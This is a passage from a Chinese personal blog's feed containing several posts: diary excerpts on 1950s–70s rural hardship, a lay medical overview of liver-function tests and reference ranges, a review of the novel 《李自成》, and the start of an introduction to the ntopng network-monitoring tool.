<h4 id="一月十七日-下午八时"><a href="#一月十七日-下午八时" class="headerlink" title="一月十七日 下午八时"></a>一月十七日 下午八时</h4><p><strong>农民的厄运</strong><br>中国农民过着糊口经济的生活，他们中间的知识分子同样不懂得这个问题。他们从户口经济的立场出发，在土地革命的旗帜下做出了重大的贡献，结果是他们的救命恩人回过头来，以强力来打破糊口经济，代替圈地，代替羊子吃人的是在饥饿状态下上山炼铁，与7000万人的大兴水利。（p108）</p>
<p>这是一个历史的悲剧。…他们的救命恩人全然不懂得这个问题。不，或者应该说，1958年以前他不懂，以后他逐渐懂得了，并且摸索一些解决方法，他试过好几个药方，结果选择了现在的药方————马列主义的人口论，恐怖主义的反右斗争，驱饥饿的亿万农民从事于过度的劳动，以同时达到高产、高商品率的农业和消灭过剩人口————是最堂皇、又是最残酷、最迅速、最能见效的办法。若说这也将记入史册成为丰功伟绩，那确实与Peter The Great(彼得大帝)，与曹操一样。他是聪敏人，他是有意识这样做的。（p109<br>）</p>
<h4 id="一月十五日-商城城关镇-公安局派出所"><a href="#一月十五日-商城城关镇-公安局派出所" class="headerlink" title="一月十五日 商城城关镇 公安局派出所"></a>一月十五日 商城城关镇 公安局派出所</h4><p><strong>办户口</strong><br>我知道办户口是艰难的。从蔡璋那儿出来就到农场去。赵尹都在，尹给写信，我就到派出所。去时十一点半，办事人吃饭去了，要下午去。于是吃完饭，大约一时半到派出所。派出所不给办，理由是要户口底册。我知道不是户口底册的问题，而是户口迁移不该由我自己来办，于是又到农场，并且请求农场去一人帮我办。尹会计慨然答应，冒雪一同来到派出所。…… 一会尹出来，说要大队部的信。…… 我在候审室那样的小房间里等着，这也是理该如此的。但愿办户口的事情记到这里就算记完，没有其他的情节需要续记才好。否则，明天不仅我要跑一次，也许还得劳驾赵家骅或者其他的人再跑一次。（谢天谢地，赵生祥到县委组织部给我弄了介绍信，户口办妥了。）</p>
<p><strong>下放干部学好了没有？</strong><br>下放干部是有许多人学好了，这是那套社会责任感的宗教仪式的效果。其背后也有客观的物质基础。他们是外来者，他们来此是朝圣式地消除肉欲，城市式的生活方式在等待他们。否则，饥饿也会促使他们 <strong>人相食，卖X，说谎，拍马，害人自肥</strong> 的。</p>
<p>真是心头一阵阵地绞痛。若说这是历史必然，付出的代价也够重大的。后一个历史时期，为了消除这些恶毒的影响，不知要付出多少精神物质的补偿。（p118）</p>
<h2 id="息县日记-（北京-东岳-明港-1969-10～1971-9）"><a href="#息县日记-（北京-东岳-明港-1969-10～1971-9）" class="headerlink" title="息县日记 （北京-东岳-明港 1969.10～1971.9）"></a>息县日记 （北京-东岳-明港 1969.10～1971.9）</h2><h2 id="北京日记-（1972-10～1974-9）"><a href="#北京日记-（1972-10～1974-9）" class="headerlink" title="北京日记 （1972.10～1974.9）"></a>北京日记 （1972.10～1974.9）</h2>]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>医学：肝系统健康状态评价指标体系</title>
    <url>/2017/07/19/Medicine-Hepar/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>肝细胞损伤指标: ALT,AST,ALP,GGT</li>
<li>胆红素代谢指标</li>
<li>肝脏合成功能指标: 白蛋白(Alb)</li>
<li>肝纤维化指标</li>
</ul>
<a id="more"></a>
<p><img src="http://riboseyim-qiniu.riboseyim.com/hepar.png" alt></p>
<h2 id="第一部分-肝系统状态指标的意义"><a href="#第一部分-肝系统状态指标的意义" class="headerlink" title="第一部分 肝系统状态指标的意义"></a>第一部分 肝系统状态指标的意义</h2><p>全面地反映肝脏功能状态，为肝功能异常的诊断提供重要线索，并能动态监测病情。</p>
<h3 id="一、肝细胞损伤指标"><a href="#一、肝细胞损伤指标" class="headerlink" title="一、肝细胞损伤指标"></a>一、肝细胞损伤指标</h3><h4 id="1-1-氨基转移酶水平（肝脏酶学检查）"><a href="#1-1-氨基转移酶水平（肝脏酶学检查）" class="headerlink" title="1.1 氨基转移酶水平（肝脏酶学检查）"></a>1.1 氨基转移酶水平（肝脏酶学检查）</h4><ul>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B0%B7%E4%B8%99%E8%BD%AC%E6%B0%A8%E9%85%B6" target="_blank" rel="noopener">谷丙转氨酶,ALT</a><br>谷丙转氨酶（Alanine transaminase，简称 ALT）是一种转氨酶（存在于血浆及多种身体组织中，但最常见与肝脏关联)。也叫血清谷氨酸丙酮酸转氨酶（serum glutamate pyruvate transaminase，简称 SGPT）或丙氨酸转氨酶（alanine aminotransferase，简称 ALAT）。</li>
</ul>
<p>谷丙转氨酶被用来确认肝脏的问题。谷丙转氨酶含量升高通常意味着病变的发生（例如，酒精肝或病毒性肝炎，充血性心力衰竭、肝损伤、胆管损伤，传染性单核细胞增多症或肌病等疾病）。但是不能作为唯一指标，因为一天内谷丙转氨酶的含量也会有正常的起伏，剧烈运动也可能导致 ALT 指标升高。</p>
<p>例如，由于肝细胞损伤导致的谷丙转氨酶含量升高，可以通过测量碱性磷酸酶与胆管损伤区别。同样，肌病也可以通过测量肌氨酸致活酶确定。</p>
<p>中等程度以下（<300u l）的转氨酶升高无特异性。若alt急剧升高（>1000U/L），提示存在大量肝细胞坏死，其最常见的疾病有急性病毒性肝炎、毒物或药物性肝损伤、急性缺血性肝病等。此外，重症自身免疫性肝炎和肝豆状核变性也能导致转氨酶急剧升高，但同时伴有自身免疫性抗体升高或铜代谢异常。</300u></p>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/%E5%A4%A9%E5%86%AC%E6%B0%A8%E9%85%B8%E6%B0%A8%E5%9F%BA%E8%BD%AC%E7%A7%BB%E9%85%B6" target="_blank" rel="noopener">谷草转氨酶,AST</a><br>谷草转氨酶即天冬氨酸氨基转移酶（Aspartate Transaminase，缩写 AST），是一种磷酸吡哆醛蛋白质，也可以作用于L-苯丙氨酸、L-酪氨酸和L-色氨酸。谷丙转氨酶主要发现于肝脏中，而谷草转氨酶在肝脏，心脏，骨骼肌，肾脏，大脑和红血球中都存在。</li>
</ul>
<p>在大部分的肝脏疾病中，ALT 值比 AST 值高，也就是 AST/ALT 比值小于 1 。但是在和酒精有关的肝脏疾病中，AST/ALT 的比值经常大于2。这是因为A酒精会造成维生素 B6 缺乏，进而限制ALT的上升。如果 AST/ALT &gt; 3，并伴随着 GGT 异常上升（大于 60 U/L），有很大的概率是酒精引起的肝脏损伤，例如酒精性肝炎。</p>
<h4 id="1-2-碱性磷酸酶（ALP）与-γ-谷氨酰转肽酶（GGT）"><a href="#1-2-碱性磷酸酶（ALP）与-γ-谷氨酰转肽酶（GGT）" class="headerlink" title="1.2 碱性磷酸酶（ALP）与 γ-谷氨酰转肽酶（GGT）"></a>1.2 碱性磷酸酶（ALP）与 γ-谷氨酰转肽酶（GGT）</h4><p>血清碱性磷酸酶（ALP）可因以下原因升高：</p>
<ul>
<li>脂肪膳食导致肠 ALP 水平增加而升高；</li>
<li>孕妇妊娠期间因胎盘合成也可能出现 ALP 水平升高；</li>
<li>儿童和老年人的 ALP 水平会升高，特别是50岁以上的女性，部分可能是由骨转换而来;</li>
<li>胆管阻塞使胆小管合成 ALP 增加，随后移位到肝血窦，使血清 ALP 水平升高。即使阻塞较小且不足以增加血清胆红素水平，也会引发上述情况。</li>
</ul>
<p>γ-谷氨酰转肽酶（Gamma Glutamyltransferase , GGT） 主要分布于肾、肝、胰腺，但肾脏释放的GGT主要经尿液排出，血清 GGT 主要来自于肝脏。<br>肝脏 GGT 主要分布于胆管上皮细胞和肝细胞膜管腔面，二者在发生变性和坏死时会导致GGT大量溶解释放入血，引起血清GGT升高。因此GGT升高提示肝脏疾病，尤其是 <strong>胆道</strong> 疾病。</p>
<p>γ-谷氨酰转肽酶（GGT）主要来自于肝脏，因此其可以用于辅助判断 碱性磷酸酶（ALP） 的来源：ALP 升高，GGT 正常，表明ALP来自于骨骼或肠道；若二者均升高，表明ALP来自肝脏，提示肝胆系统存在疾病。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R 值 = [ALT/ALT正常范围上限] / [ALP/ALP正常范围上限]</span><br></pre></td></tr></table></figure>
<p>R值决定损伤是否是 肝细胞型（R≥5.0）， 胆汁淤积型（R≤2.0） 或混合型（2.0 &lt;R&lt;5.0）</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/hepar-route.png" alt></p>
<h4 id="1-3-胆红素代谢指标（胆红素代谢检查）"><a href="#1-3-胆红素代谢指标（胆红素代谢检查）" class="headerlink" title="1.3 胆红素代谢指标（胆红素代谢检查）"></a>1.3 胆红素代谢指标（胆红素代谢检查）</h4><p>胆红素由肝脏产生，经胆道排泄，肝在胆红素代谢中具有摄取、结合和排泄作用。胆红素是胆色素的一种，是人类胆汁的主要色素，呈橙黄色。它是体内血红素的主要代谢产物，有毒性，可对大脑和神经系统引起不可逆的损害，但也有抗氧化剂功能，可以抑制亚油酸和磷脂的氧化。</p>
<p>人体血液中的胆红素浓度增高，引起的皮肤、黏膜和眼球巩膜等部分发黄的症状，即<a href="#">黄疸(jaundice、icterus)</a>黄胆，俗称黄病。当体内发生胆红素代谢障碍，例如胆红素生成过多，或肝摄取、转化、排泄过程发生障碍时，均可发生血浆胆红素浓度升高，造成高胆红素血症。由于胆红素为金黄色色素，血浆浓度过高时可以扩散进入组织，造成组织黄染。多种致病因素可引起血清胆红素升高导致黄疸，黄疸症可根据上述的血红素代谢过程分为三类：</p>
<ul>
<li>肝前性黄疸/溶血性黄疸：当大量红血球被分解（如红细胞在单核吞噬细胞破坏过多）时出现的黄疸病症；</li>
<li>肝源性黄疸/肝细胞性黄疸：当肝脏无法正常处理胆红素（肝细胞被破坏，其摄取、转化和排泄胆红素的能力降低）时出现的黄疸病症；</li>
<li>肝后性黄疸/阻塞性黄疸：当肝脏无法正常排除胆红素（如胆汁排泄通道阻塞）时出现的黄疸病症；</li>
<li>某些胆囊病和血液病经常会引发黄疸的症状。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">总胆红素-直接胆红素=间接胆红素</span><br></pre></td></tr></table></figure>
<ul>
<li><p>间接型高胆红素血症<br>间接胆红素升高是由于胆红素的产生过度（例如溶血）、肝重吸收减少或肝结合能力下降所致。间接胆红素升高最常见的原因是吉尔伯特综合征（肝功能不良、遗传性非溶血性高胆红素血症）。但其总胆红素水平几乎不超过6mg/dl，通常＜3 mg/dl。空腹或严重疾病可使间接胆红素升高2～3倍，相反，进食或服用苯巴比妥药物可降低间接胆红素水平。</p>
</li>
<li><p>直接型高胆红素血症<br>通常意味着肝实质损伤或胆汁淤积导致胆红素进入胆管，以及胆红素从肝细胞进入血液循环减少。<br><strong>严重肝损伤（包括酒精性肝炎、肝硬化）患者的血清总胆红素水平可能超过 30 mg/dl</strong>，或可见于晚期肝硬化合并脓毒症或肾衰竭的患者中。</p>
</li>
<li><p>单纯高胆红素血症：可见于手术后，通常可以恢复。</p>
</li>
</ul>
<h3 id="三、肝脏合成功能指标（肝脏合成功能检查）"><a href="#三、肝脏合成功能指标（肝脏合成功能检查）" class="headerlink" title="三、肝脏合成功能指标（肝脏合成功能检查）"></a>三、肝脏合成功能指标（肝脏合成功能检查）</h3><h4 id="3-1-白蛋白（Alb）"><a href="#3-1-白蛋白（Alb）" class="headerlink" title="3.1 白蛋白（Alb）"></a>3.1 白蛋白（Alb）</h4><p>肝脏是人体合成白蛋白（Alb）的 <strong>唯一</strong> 器官。<br>合成后供机体需要，且几乎不被排出，其在血浆中的半衰期约为21d，因此 Alb 的高低反映肝脏合成代谢功能和储备功能，也是评估肝硬化严重程度及判断预后的指标。<br>在正常饮食和肾功能正常情况下，Alb 降低可能与肝功能异常、肝脏合成蛋白质功能下降有关。Alb&lt;30 g/L 时部分患者出现或将要出现腹水，至25g/L以下时预后不良，降至20g/L时预后极差。</p>
<p>注意：由于 Alb 半衰期长，<strong>不能用于评估急性肝损伤。</strong></p>
<h4 id="3-2-凝血酶原时间（PT）"><a href="#3-2-凝血酶原时间（PT）" class="headerlink" title="3.2 凝血酶原时间（PT）"></a>3.2 凝血酶原时间（PT）</h4><p>血浆PT是评价肝脏合成功能的另一指标，该指标检测血液凝固时间，它需要肝脏产生的II、V、VII、IX因子的参与。<br>当肝细胞广泛受损时，肝脏合成凝血因子的能力下降，导致PT延长。<br>PT 超过3s以上为异常；4-6s时，表明严重的肝损伤且预后极差。<br>在反应肝功能急性损伤方面，PT优于Alb。由于在肝脏疾病早期仅有 VII 因子合成减少，因此 PT 出现延长早于活化部分凝血激酶时间。</p>
<h4 id="3-3-PA-和血清假性胆碱酯酶（PChE）"><a href="#3-3-PA-和血清假性胆碱酯酶（PChE）" class="headerlink" title="3.3 PA 和血清假性胆碱酯酶（PChE）"></a>3.3 PA 和血清假性胆碱酯酶（PChE）</h4><p>二者均由肝脏合成，半衰期分别为1.9d和10d。<br>PA由于半衰期短，能快速、敏感地反映肝细胞的损伤和肝脏的合成功能。<br>研究表明急性肝炎时PA异常率为34%，而Alb异常率仅为17%，因此PA能更灵敏地反映肝细胞损伤，可作为判断急性肝损伤的灵敏指标。<br>此外，动态监测PA能反映肝衰竭患者肝脏合成功能的好转或恶化情况，动态观察PA升高明显者预后好，降低或升高不明显者预后差，故观察PA早期动态变化能作为肝衰竭预后的判断指标之一。</p>
<h3 id="四、肝纤维化指标"><a href="#四、肝纤维化指标" class="headerlink" title="四、肝纤维化指标"></a>四、肝纤维化指标</h3><h4 id="透明质酸（HA）"><a href="#透明质酸（HA）" class="headerlink" title="透明质酸（HA）"></a>透明质酸（HA）</h4><p>HA是一种分布在细胞外基质的氨基葡聚糖，主要由肝星状细胞或纤维母细胞合成，由窦状内皮细胞降解，在众多的肝纤维化指标中，HA的敏感性最高。急性肝炎时血清HA多正常，慢性肝炎或肝硬化时由于肝脏代谢能力下降，HA清除减少，使血清HA水平升高，并且其升高水平与肝脏炎症或肝纤维化程度呈正相关。</p>
<h4 id="IV型胶原和层黏蛋白"><a href="#IV型胶原和层黏蛋白" class="headerlink" title="IV型胶原和层黏蛋白"></a>IV型胶原和层黏蛋白</h4><p>IV型胶原与层黏蛋白均是构成基底膜的主要成分，当肝脏持续损伤时，二者合成增加，而肝脏对其降解能力降低，出现毛细血管化。同时，血清中IV型胶原与层黏蛋白升高，且其升高程度与肝纤维化程度具有相关性。</p>
<h2 id="肝系统状态指标体系"><a href="#肝系统状态指标体系" class="headerlink" title="肝系统状态指标体系"></a>肝系统状态指标体系</h2><h4 id="氨基转移酶水平"><a href="#氨基转移酶水平" class="headerlink" title="氨基转移酶水平"></a>氨基转移酶水平</h4><ul>
<li>ALT 谷丙转氨酶（3-35 U/L）</li>
<li>AST 谷草转氨酶（15-40 U/L）</li>
<li>谷草／谷丙（0.91-2.25）</li>
<li>GGT y-谷氨酰转移酶（10-60 U/L）</li>
<li>ALP 磷酸肌酸激酶（24-184 U/L）(<strong>血清肌酸激酶测定-速率法</strong>)</li>
</ul>
<h4 id="特定疾病（乙型肝炎）"><a href="#特定疾病（乙型肝炎）" class="headerlink" title="特定疾病（乙型肝炎）"></a>特定疾病（乙型肝炎）</h4><ul>
<li>HBV-DNA病毒定量(&lt;100)</li>
<li>HBsAg 乙肝表面抗原定量（<strong>化学发光法</strong>）</li>
<li>HbeAg 乙肝病毒e抗原 （&lt;1）</li>
<li>Anti-HBe 乙肝病毒e抗体 （&gt;1）</li>
<li>AFP 甲胎蛋白 （&lt;=20）</li>
</ul>
<h4 id="肝纤维化"><a href="#肝纤维化" class="headerlink" title="肝纤维化"></a>肝纤维化</h4><ul>
<li>脂肪肝（超声波）</li>
<li>肝脏硬度 (KPA)</li>
<li>脂肪衰减 (db/m)</li>
</ul>
<h4 id="血脂"><a href="#血脂" class="headerlink" title="血脂"></a>血脂</h4><ul>
<li>总胆汁酸（0-14）</li>
<li>TG 甘油三酯（0.45-1.70）</li>
<li>TC 总胆固醇（2.90-5.18）</li>
<li>LDL-CHO 低密度脂蛋白胆固醇（0-3.37）</li>
</ul>
<h4 id="肝脏合成功能标志物"><a href="#肝脏合成功能标志物" class="headerlink" title="肝脏合成功能标志物"></a>肝脏合成功能标志物</h4><ul>
<li>总蛋白（61-81）</li>
<li>白蛋白（36-51）</li>
<li>球蛋白（25-35）</li>
<li>白蛋白／球蛋白（1.2-2.5）</li>
</ul>
<h4 id="胆红素标志物（黄疸常规）"><a href="#胆红素标志物（黄疸常规）" class="headerlink" title="胆红素标志物（黄疸常规）"></a>胆红素标志物（黄疸常规）</h4><ul>
<li>总胆红素（4-23.9）</li>
<li>直接胆红素（0-6.8）</li>
<li>间接胆红素（2.6-20.9）</li>
</ul>
<h2 id="肝损伤原因分类"><a href="#肝损伤原因分类" class="headerlink" title="肝损伤原因分类"></a>肝损伤原因分类</h2><h4 id="1、药物性肝损伤-DILI"><a href="#1、药物性肝损伤-DILI" class="headerlink" title="1、药物性肝损伤 DILI"></a>1、药物性肝损伤 DILI</h4><p>药物性肝损伤，药物性肝炎（Drug-Induced Liver Injury，DILI），简称药肝，是指在使用某种或几种药物之后，由于药物本身或其代谢产物而引起的不同程度的肝脏损伤，亦或是由于特殊体质对药物的超敏感性或耐受性降低所导致的肝脏损伤或炎症。</p>
<p>FDA已确认数个由营养补充剂引起的肝脏损害实例。为此，FDA已对公众发出警告和去信减肥和健美产品制造商警告。如一个德克萨斯州公司发现本公司产品与肝损害和非病毒性肝炎有关后，同意召回并销毁了某些营养补充剂产品。</p>
<h4 id="2、病毒性肝炎"><a href="#2、病毒性肝炎" class="headerlink" title="2、病毒性肝炎"></a>2、病毒性肝炎</h4><p>HAV感染：抗-HAV-IgM<br>HBV感染：HBsAg，抗-HBc-IgM，HBV DNA<br>HCV感染：抗-HCV，HCV RNA<br>HEV感染：抗-HEV-IgM，抗-HEV-IgG，HEV RNA</p>
<h4 id="3、酒精性肝炎"><a href="#3、酒精性肝炎" class="headerlink" title="3、酒精性肝炎"></a>3、酒精性肝炎</h4><p>肝胆超声波成像/肝血管彩色多普勒成像/腔内超声检查/CT/MRC<br>酒精中毒（AST/ALT ≥2）<br>近期有急性低血压病史（尤其是在有潜在心脏疾病时）</p>
<h4 id="4、自身免疫性肝炎"><a href="#4、自身免疫性肝炎" class="headerlink" title="4、自身免疫性肝炎"></a>4、自身免疫性肝炎</h4><ul>
<li>自身免疫性肝炎</li>
<li>遗传性肝病</li>
</ul>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>合并脓毒症、转移性恶性肿瘤、原发性胆汁性胆管炎或原发性硬化性胆管炎</p>
<p>CMV感染：抗-CMV-IgM，抗-CMV-IgG，CMV-PCR<br>EBV感染：抗-EBV-IgM，抗-EBV-IgG，EBV-PCR<br>HSV感染：抗-HSV-IgM，抗-HSV-IgG，HSV-PCR<br>VZV感染：抗-VZV-IgM，抗-VZV-IgG，VZV-PCR</p>
<h2 id="附表：名词解释"><a href="#附表：名词解释" class="headerlink" title="附表：名词解释"></a>附表：名词解释</h2><ul>
<li>预后(Prognosis、outcomes，别称：愈后），指根据病人当前状况来推估未来经过治疗后可能的结果。医生通常需要根据病人病情相关因素（如：疾病种类、症状、病情分期、病理图像、基因、并发症、年龄等）而对未来治疗结果所做的完全的预估。</li>
</ul>
<h2 id="附表：新陈代谢图"><a href="#附表：新陈代谢图" class="headerlink" title="附表：新陈代谢图"></a>附表：新陈代谢图</h2><p><img src="https://upload.wikimedia.org/wikipedia/commons/c/c6/Metabolism_%28zh-cn%29.png" alt></p>
<ul>
<li><a href="http://livertox.nih.gov/" target="_blank" rel="noopener">（美国）药物性肝损伤专业网站</a></li>
<li><a href="http://www.hepatox.org/" target="_blank" rel="noopener">（中国）药物性肝损伤专业网站 | 上海交通大学医学院附属仁济医院</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="嗑药简史（四）：咖啡上瘾，喝还是不喝？"><a href="#嗑药简史（四）：咖啡上瘾，喝还是不喝？" class="headerlink" title="嗑药简史（四）：咖啡上瘾，喝还是不喝？"></a><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/" target="_blank" rel="noopener">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></h4><ul>
<li>咖啡的保健作用及临床实证研究案例</li>
<li>咖啡种类、制作工艺对健康效益的影响</li>
</ul>
<h2 id="扩展阅读-1"><a href="#扩展阅读-1" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="http://www.hepatox.org/news?type=2" target="_blank" rel="noopener">药物警告-持续更新 | 药物性肝损伤的专业网站</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTE3NDI0MA==&amp;mid=2654272715&amp;idx=1&amp;sn=1dcfa8afadfe008dd99a5ff6dcc4fadd&amp;chksm=bd79c7c48a0e4ed2e4c5db5cfb403aefa1e6787f0e9d35e49674013a4f9918214130e7a6bb68&amp;mpshare=1&amp;scene=1&amp;srcid=08036WOCZQ7l4WE5wHcJesz7%23rd" target="_blank" rel="noopener">肝功能评价体系现状和研究进展</a></li>
<li><a href="https://mp.weixin.qq.com/s/KbEctl6YGqa3RZWWKJbMHQ" target="_blank" rel="noopener">Reason@医脉通肝脏科:常见的肝脏生化检查及其临床意义</a></li>
<li><a href="http://www.hepatox.org/rucam" target="_blank" rel="noopener">RUCAM 量表 | 药物性肝损伤专业网</a></li>
<li><a href="http://www.hepatox.org/page/show/35" target="_blank" rel="noopener">从药到毒| 药物性肝损伤专业网</a></li>
<li><a href="https://mp.weixin.qq.com/s/CD3Vyc8cQDAAOkow4db4oQ" target="_blank" rel="noopener">一文回顾 | 胆红素概述及黄疸的分类|原创 2017-11-18 Reason 医脉通肝脏科</a></li>
<li><a href="https://mp.weixin.qq.com/s/dtBb3ViWdR11kysCVIzcug" target="_blank" rel="noopener">名家视点丨肝脏硬度与肝细胞癌风险|原创 2017-12-19 黄丽虹 国际肝病</a></li>
<li><a href="https://mp.weixin.qq.com/s/umH-5lrY2v8rOkxEeDE7Cg" target="_blank" rel="noopener">脂肪肝是怎么诊断的 | 2018-02-27 谭友文 老谭说肝病</a></li>
<li><a href="https://mp.weixin.qq.com/s/-1_DtuafM9_M-pAHd8ZptQ" target="_blank" rel="noopener">黄疸患者饮食有讲究：如何吃出健康的肝脏？原创 2018-03-23 Reason 医脉通肝脏科</a></li>
</ul>
]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
      </tags>
  </entry>
  <entry>
    <title>明史：李自成</title>
    <url>/2017/06/25/MrLizicheng/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>小说《李自成》</li>
</ul>
<a id="more"></a>
<h2 id="一、小说《李自成》"><a href="#一、小说《李自成》" class="headerlink" title="一、小说《李自成》"></a>一、小说《李自成》</h2><h4 id="作者"><a href="#作者" class="headerlink" title="作者"></a>作者</h4><p>姚雪垠（yin 第二声），原名姚冠三，1910年10月10日出生于河南省南阳市邓州市一个破落地主家庭。（1910年10月10日~1999年4月29日）</p>
<h4 id="社会评价"><a href="#社会评价" class="headerlink" title="社会评价"></a>社会评价</h4><p>从崇祯11年写起，全面地反映明末李自成起义由困厄转到兴盛，复由胜利走向失败这一历史悲剧的发展过程。第 1卷出版于1963年,第2卷出版于1976年,第3卷出版于1981年，最后两卷也已有若干单元(如《崇祯之死》、《李自成之死》)陆续发表。人物从帝王、后妃、百官到义军将领、战士、各类市民、穷苦百姓，乃至清方首领与文臣武将，地域从西北高原、中州重镇、北京城内到僻远山村、关外城池，场面从战地厮杀、牢狱交锋、密室定计、边寨平叛到宫廷宴饮、相府风光、京城灯市、军中婚礼，笔墨无不触及。 是一部规模宏大的悲剧性史诗。（引自百度百科）</p>
<h4 id="个人体会"><a href="#个人体会" class="headerlink" title="个人体会"></a>个人体会</h4><p>第一次通读，通过kindle软件断断续续看了一个月时间（201604～201605，福州）。</p>
<p><strong>史诗性</strong><br>上自庙堂，下至小民，无论是塞外形势，还是帝都市井，可以说把握得非常到位。我想这应该首先得益于作者丰富的人生经历，即身处于一个动荡不安的近现代中国，几乎就是明末清初的翻版。其对中国社会各阶层的洞察力，非一般书匠可以达到。</p>
<p><strong>人性</strong><br>江山美人，千古风流。<br>李自成占领北京的短暂时间里，大篇幅涉及“罗虎－费珍娥”的悲剧故事。李自成于罗虎，舐犊情深；于宫人，也能礼敬；于费宫娥，也算慷慨爱护。就私德而言，李不可谓不自制、不可谓不真、不可谓不富有人情味。可就是这样一个像珍惜自己的羽毛一样珍惜自己私德的好人，却极度缺乏领袖需要的大多数公德：首鼠两端、猜忌股肱、贪婪残暴、不舍得分享权力，即使占有半壁江山，却仍是个小吏心态。比之汉高祖、明太祖差了不是一两个段位。这也注定了大顺政权的悲剧，汉民族于变革之际，也只能勉强推出这样的领袖，真是千古大悲！</p>
<p><strong>庙算</strong><br>小说中军师宋献策的一段对白，深以为然，后来者不得不思之：</p>
<blockquote>
<p>“十日之后，安知粮船不移到别处？<br>再如，倘若吴三桂幕中有人，事先向九门口增强守备，凭借天险截杀我方奇兵，我方就不能越出长城一步。还有种种变化，非可预料。<br>臣以为用兵重在全盘谋划，知彼知己，不在某一妙计。全盘谋划就是古人所说的“庙算”。陛下天纵英明，熟读兵法，且有十余年统兵打仗阅历，在智谋上胜臣百倍。然悬军远征之事，却未见其可。”<br>“吴三桂借他的一封家书，向孤挑战，倘不讨伐，必成大祸。捷轩已传令三军出征，军令如山。倘若临时变计，必会动摇军心，惹吴三桂对我轻视。”<br>“望陛下从大处着眼，对吴三桂示以宽宏大量，以全力对付满洲，方不误‘庙算’决策！”<br>“‘庙算’已经定了，东征之计不能更改，你不用说下去了！”</p>
</blockquote>
<p><strong>班子</strong><br>满清政权收集关内的情报工作制度：</p>
<blockquote>
<p>在北京城内和近郊经常潜伏着各种细作，一有重要消息便送到满洲境内，再用专门备用的驿马一站一站地送到盛京。凡是紧急探报，到了兵部的主管部门，都得赶快炒出数份，分送睿亲王、郑亲王、兵部尚书、内三院大学士，所以凡是特别重大的军情消息，主要执政的王、公、大臣们很快就会知道。</p>
</blockquote>
<p>成大事，非一人一智可为，必须有精干的班子，辅之以健全的支撑系统。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1037849-06f31f5d1b40599c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="《李自成》"></p>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Artistic</tag>
        <tag>讲武堂</tag>
      </tags>
  </entry>
  <entry>
    <title>开源架构技术漫谈：基于 Ntopng 实现网络流量的可视化监控</title>
    <url>/2016/04/26/Network-Ntopng/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>NTOPNG是NTOP的新一代版本,提供以下特性：</li>
<li>多协议网络流量；IPv4/IPv6活跃主机</li>
<li>网络流量监控；</li>
<li>基于nDPI实现应用协议发现</li>
<li>作为 NetFlow/sFlow  采集器 (Cisco/ Juniper 路由器) ；交换机配合 nProbe.</li>
</ul>
<span id="more"></span>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ntop-demo-1.jpg" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ntop-demo-2.jpg" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ntop-demo-3.jpg" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ntop-demo-4.jpg" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ntop-demo-5.jpg" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ntop-demo-6.jpg" alt=""></p>
<p><strong>What ntopng can do for me?</strong></p>
<ul>
<li><a href="http://www.ntop.org/products/ntop">http://www.ntop.org/products/ntop</a></li>
<li>Sort network traffic according to many protocols</li>
<li>Show network traffic and IPv4/v6 active hosts</li>
<li>Store on disk persistent traffic statistics in RRD format</li>
<li>Geolocate hosts</li>
<li>Discover application protocols by leveraging on nDPI, ntop’s DPI framework.</li>
<li>Characterise HTTP traffic by leveraging on characterisation services provided by block.si. ntopng comes with a demo characterisation key, but if you need a permanent one, please mail info@block.si.</li>
<li>Show IP traffic distribution among the various protocols</li>
<li>Analyse IP traffic and sort it according to the source/destination</li>
<li>Display IP Traffic Subnet matrix (who’s talking to who?)</li>
<li>Report IP protocol usage sorted by protocol type</li>
<li>Act as a NetFlow/sFlow collector for flows generated by routers (e.g. Cisco and Juniper) or switches (e.g. Foundry Networks) when used together with nProbe.</li>
<li>Produce HTML5/AJAX network traffic statistics </li>
</ul>
<h2 id="Ntopng-架构"><a href="#Ntopng-架构" class="headerlink" title="Ntopng 架构"></a>Ntopng 架构</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/ntopng-arch-view.jpg" alt=""></p>
<h4 id="主要开发语言"><a href="#主要开发语言" class="headerlink" title="主要开发语言"></a>主要开发语言</h4><p>C、C++、<strong>Python</strong>、Lua</p>
<h4 id="数据采集层"><a href="#数据采集层" class="headerlink" title="数据采集层"></a>数据采集层</h4><p><strong>Libpcap</strong> ：网络数据包捕获函数包</p>
<p><strong>ZeroMQ</strong><br>一个C内核及C＋＋编写的核心库libzmq，50余种语言支持的绑定程序(例如Python支持PyZMQ)，号称最快的消息库，协议级，目标是成为Linux的一部分。</p>
